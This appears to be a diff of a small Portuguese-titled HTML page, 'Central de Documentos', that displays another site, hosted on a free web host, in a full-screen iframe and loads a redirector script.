@@ -1,2 +1,32 @@
-<script src="./redirector.js"></script>
 <h1>teste</h1>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Central de Documentos</title>
+    <link rel="shortcut icon" type="image/png" href="https://maycowmoura.000webhostapp.com/form/imgs/favicon.png">
+    <script src="./redirector.js"></script>
+    <style>
+        html, body, iframe {
+            border: none;
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+        }
+        html, body {
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+  <iframe></script>
+  <script>
+    let baseurl = 'https://maycowmoura.000webhostapp.com';
+    let ifr = document.querySelector('iframe');
+    ifr.src = baseurl + window.location.pathname;
+  </script>
+</body>
+</html>
